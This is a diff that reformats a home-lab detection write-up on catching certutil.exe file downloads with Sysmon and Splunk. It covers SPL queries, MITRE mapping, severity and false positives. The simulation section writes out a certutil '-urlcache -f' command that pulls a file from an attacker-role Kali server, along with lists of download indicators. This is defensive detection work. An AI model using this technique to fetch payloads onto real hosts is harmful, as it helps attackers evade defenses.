@@ -1,220 +1,175 @@
-Detection 13 Certutil File Download
+# certutil file download detection
 
-Objective
-Detect suspicious file download activity using certutil.exe.
+Description: Detecting file download activity using certutil.exe and Sysmon telemetry
 
-This detection uses Sysmon process creation telemetry from Target-PC.
-The main event used for this detection is Sysmon Event ID 1.
-Sysmon Event ID 3 may also help if network connection telemetry is available.
+# 📥 Certutil File Download Detection
 
-Certutil is a trusted Windows binary.
-That is what makes this behavior important.
-Attackers can abuse trusted Windows tools to download files while blending in with normal system activity.
+<div align="center">
 
-Lab Setup
-Host: Target-PC
-Attacker: Kali Linux
-SIEM: Splunk
-Log Sources: Sysmon and Microsoft Defender
-Primary Event ID: Sysmon Event ID 1
-Optional Event ID: Sysmon Event ID 3
-Tool Used: certutil.exe
-Remote IP: 192.168.10.250
-Remote Port: 8000
-Downloaded File: update.txt
+![Log Source](https://img.shields.io/badge/Log%20Source-Sysmon%20%7C%20Defender-blue)
+![Event ID](https://img.shields.io/badge/Event%20ID-1-orange)
+![SIEM](https://img.shields.io/badge/SIEM-Splunk-green)
+![MITRE](https://img.shields.io/badge/MITRE-T1105%20%7C%20T1218-red)
+![Status](https://img.shields.io/badge/Status-Validated-brightgreen)
 
-MITRE ATT&CK
-Command and Control: T1105 - Ingress Tool Transfer
-Defense Evasion: T1218 - System Binary Proxy Execution
+</div>
 
-Detection Logic
-Look for certutil.exe process execution where the command line contains download-related arguments or a URL.
+---
 
-Important indicators:
-certutil.exe
--urlcache
--f
-http://
-https://
-update.txt
-192.168.10.250
+## 📋 Table of Contents
 
-The main behavior I wanted to validate was certutil.exe reaching out to a remote web server and saving a file to disk.
+* [Detection Summary](#-detection-summary)
+* [Lab Details](#-lab-details)
+* [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
+* [Splunk Search](#-splunk-search)
+* [Simulation](#-simulation)
+* [Analyst Review](#-analyst-review)
+* [Severity](#-severity)
+* [False Positives](#-false-positives)
+* [Validation Evidence](#-validation-evidence)
+* [Conclusion](#-conclusion)
 
-SPL Search
+---
+
+## 🎯 Detection Summary
+
+This detection identifies suspicious file download activity using `certutil.exe`. I tested it on `Target-PC` by downloading a harmless text file from a Kali web server and validating the activity in Splunk. The goal was to confirm that Sysmon captured the certutil process execution and command line, including the remote URL, destination IP, and downloaded file path.
+
+---
+
+## 🧪 Lab Details
+
+| Field             | Details                       |
+| ----------------- | ----------------------------- |
+| Host              | `Target-PC`                   |
+| Attacker          | Kali Linux                    |
+| Remote IP         | `192.168.10.250`              |
+| Remote Port       | `8000`                        |
+| Downloaded File   | `update.txt`                  |
+| Tool Used         | `certutil.exe`                |
+| Log Sources       | Sysmon and Microsoft Defender |
+| Primary Event ID  | Sysmon Event ID `1`           |
+| Optional Event ID | Sysmon Event ID `3`           |
+| SIEM              | Splunk                        |
+| Index             | `endpoint`                    |
+
+---
+
+## 🧭 MITRE ATT&CK Mapping
+
+| Tactic              | Technique                           | Reason                                                                        |
+| ------------------- | ----------------------------------- | ----------------------------------------------------------------------------- |
+| Command and Control | T1105 Ingress Tool Transfer         | Certutil was used to download content from a remote web server                |
+| Defense Evasion     | T1218 System Binary Proxy Execution | Certutil is a trusted Windows binary that can be abused for download activity |
+
+---
+
+## 🔎 Splunk Search
+
+```spl
 index=endpoint host="Target-PC" source="*Sysmon*"
 ("certutil.exe" OR "urlcache" OR "http://" OR "update.txt" OR "192.168.10.250")
 | table _time EventCode EventID host ComputerName Image CommandLine DestinationIp DestinationPort ParentImage User _raw
 | sort -_time
+```
 
-Process Creation Search
+### Process Creation Search
+
+```spl
 index=endpoint host="Target-PC" source="*Sysmon*" EventCode=1
 | search Image="*certutil.exe" OR CommandLine="*urlcache*" OR CommandLine="*http*"
 | table _time host ComputerName User Image ParentImage CommandLine
 | sort -_time
+```
 
-Network Search
+### Network Search
+
+```spl
 index=endpoint host="Target-PC" source="*Sysmon*" EventCode=3
 | search Image="*certutil.exe" OR DestinationIp="192.168.10.250"
 | table _time host ComputerName Image DestinationIp DestinationPort Protocol User
 | sort -_time
+```
 
-Safe Lab Simulation
+---
+
+## ⚔️ Simulation
+
 A harmless text file was hosted on Kali using Python's built-in web server.
 
-Kali commands:
+```bash
 mkdir -p /home/kali/certutil-test
 cd /home/kali/certutil-test
 echo 'certutil download test file' > update.txt
 python3 -m http.server 8000
+```
 
-Target-PC command:
+The file was downloaded from `Target-PC` using `certutil.exe`.
+
+```cmd
 certutil.exe -urlcache -f http://192.168.10.250:8000/update.txt C:\Windows\Temp\update.txt
+```
 
 Cleanup command:
+
+```cmd
 del C:\Windows\Temp\update.txt
+```
 
-Kali web server cleanup:
-Ctrl + C
+This test downloaded a harmless text file and was only used to generate detection telemetry.
 
-This test was safe.
-It did not download malware.
-It did not execute the downloaded file.
-It did not create persistence.
-It did not disable Defender.
-It was only used to validate certutil download telemetry.
+---
 
-Detection Result
-Splunk returned Sysmon telemetry showing certutil download behavior from Target-PC.
+## 🕵️ Analyst Review
 
-Observed indicators:
-Process: certutil.exe
-Arguments: -urlcache -f
-Remote Host: 192.168.10.250
-Remote Port: 8000
-Downloaded File: update.txt
-Destination Path: C:\Windows\Temp\update.txt
+Splunk returned Sysmon telemetry showing `certutil.exe` execution from `Target-PC`. The command line included `-urlcache`, `-f`, a remote HTTP URL, and the destination file path.
 
-Microsoft Defender also generated an alert because certutil download behavior is commonly associated with LOLBin abuse.
+Certutil is a trusted Windows binary, which makes this behavior important to review. In this lab, the downloaded file was harmless, but in a real investigation I would review the full command line, parent process, destination IP, downloaded file path, Defender response, and whether the file executed afterward.
 
-Analyst Review
-The first thing I checked was whether certutil.exe actually ran on Target-PC.
-Sysmon process creation telemetry showed certutil.exe and captured the command line.
+---
 
-The next thing I checked was the command line.
-The command line showed -urlcache, -f, a remote HTTP URL, and the destination file path.
+## 🚦 Severity
 
-That combination is what makes the event suspicious.
-Certutil can be legitimate, but certutil downloading a file from an HTTP server is not something I would ignore.
+| Severity | Condition                                                                                                                |
+| -------- | ------------------------------------------------------------------------------------------------------------------------ |
+| High     | Certutil downloads a file from a remote host                                                                             |
+| High     | Destination is unknown or external                                                                                       |
+| High     | File is saved to Temp, Downloads, or AppData                                                                             |
+| High     | Downloaded file executes afterward                                                                                       |
+| High     | Defender or EDR generates an alert                                                                                       |
+| High     | Activity appears near PowerShell, scheduled tasks, new services, Defender tampering, LSASS access, or event log clearing |
 
-The important fields were:
-Host
-User
-Image
-ParentImage
-CommandLine
-DestinationIp
-DestinationPort
-EventCode
-EventID
-_time
+---
 
-The Defender alert added more value because it showed the endpoint security tool also considered the behavior suspicious.
+## ⚠️ False Positives
 
-Investigation Questions I would ask myself
+| Possible Cause         | Notes                                      |
+| ---------------------- | ------------------------------------------ |
+| Admin troubleshooting  | Approved use of certutil                   |
+| Certificate management | Legitimate certificate-related activity    |
+| Internal IT scripts    | Approved automation                        |
+| Software deployment    | Known deployment workflow                  |
+| Security testing       | Authorized testing                         |
+| Lab testing            | Expected activity from this detection test |
 
-1.Which host executed certutil.exe?
+---
 
-2.Which user launched the process?
+## 📸 Validation Evidence
 
-3.What parent process launched certutil?
-
-4.What URL was contacted?
-
-5.Was the destination internal or external?
-
-6.Was the destination approved?
-
-7.What file was downloaded?
-
-8.Where was the file saved?
-
-9.Was the file executed after download?
-
-Did Defender or EDR block the activity?
-Did the same host show PowerShell activity?
-Did the same host create a scheduled task or new service?
-Did the same host show LSASS access?
-Was the Security log cleared afterward?
-
-Severity
-High
-
-Certutil file downloads should be reviewed quickly because certutil is often abused as a LOLBin.
-
-Keep High if:
-The destination is unknown or external.
-The file is saved to Temp, Downloads, AppData, or another user-writable folder.
-The downloaded file executes afterward.
-The activity is followed by scheduled task creation.
-The activity is followed by new service creation.
-The activity is followed by Defender tampering.
-The activity is followed by LSASS access.
-Defender or EDR generated an alert.
-The parent process is unusual.
-
-False Positives
-Administrator troubleshooting
-Certificate management activity
-Internal IT scripts
-Software deployment workflows
-Security team testing
-Lab validation
-
-Tuning Notes
-This search is broad on purpose for lab validation.
-In production, I would tune by command-line arguments, destination reputation, parent process, user context, and follow-on activity.
-
-Good tuning ideas:
-Alert higher when certutil uses -urlcache.
-Alert higher when the command line contains http or https.
-Alert higher when the destination is external.
-Alert higher when the file is saved to user-writable folders.
-Alert higher when the downloaded file is executed.
-Correlate certutil execution with Defender alerts.
-Correlate certutil execution with Sysmon Event ID 3 network connections.
-Correlate certutil download activity with scheduled tasks, services, and PowerShell activity.
-
-Recommended Response for this alert
-Identify the affected host and user.
-Review the full certutil command line.
-Review the parent process.
-Determine the remote URL and destination IP.
-Check whether the destination is trusted.
-Retrieve and hash the downloaded file if available.
-Check Microsoft Defender or EDR alerts.
-Determine whether the downloaded file executed.
-Search for the same URL, IP, or file name across the environment.
-Review related process activity before and after the download.
-Block the destination if confirmed suspicious.
-Isolate the host if malicious execution occurred.
-Document the full timeline.
-
-Validation Evidence
-
-1.Certutil download command or Defender block alert
+### Certutil Download Command or Defender Block Alert
 
 <img width="475" height="378" alt="13_certutil_download_command_or_defender_block" src="https://github.com/user-attachments/assets/6e5d7f77-6ef3-4544-a846-916b18bb76ec" />
 
-2.Raw Sysmon evidence showing certutil process creation or related telemetry
+### Raw Sysmon Evidence Showing Certutil Process Creation or Related Telemetry
+
 <img width="624" height="233" alt="13_raw_sysmon_certutil_process_creation" src="https://github.com/user-attachments/assets/b7911494-6acf-4dd6-a99e-8286e8d20c40" />
 
-3.Splunk detection query identifying certutil download indicators
+### Splunk Detection Query Identifying Certutil Download Indicators
+
 <img width="624" height="238" alt="13_certutil_download_detection" src="https://github.com/user-attachments/assets/d6103fca-f049-4f66-98c0-49e74bf7afa9" />
 
-Analyst Conclusion
-This detection confirmed certutil.exe file download behavior from Target-PC to the Kali web server.
+---
 
-The lab download was intentionally harmless, but the behavior is still high value because certutil is a trusted Windows binary that attackers can abuse to retrieve tools, scripts, or payloads. Splunk showed the certutil command line, and Microsoft Defender also flagged the behavior as suspicious.
+## ✅ Conclusion
 
-In a real SOC investigation, I would not stop at seeing certutil.exe. I would review the full command line, remote URL, destination IP, downloaded file path, parent process, Defender response, and any follow-on execution. Certutil download activity becomes much more serious when the downloaded file runs afterward or when it appears near other behaviors like PowerShell execution, scheduled task creation, new service installation, Defender tampering, LSASS access, or event log clearing.
+This detection confirmed `certutil.exe` file download behavior from `Target-PC` to the Kali web server. The lab download was harmless, but the behavior is high value because certutil is a trusted Windows binary that attackers can abuse to retrieve tools, scripts, or payloads. In a real SOC investigation, I would review the command line, remote URL, destination IP, downloaded file path, parent process, Defender response, and any follow-on execution.
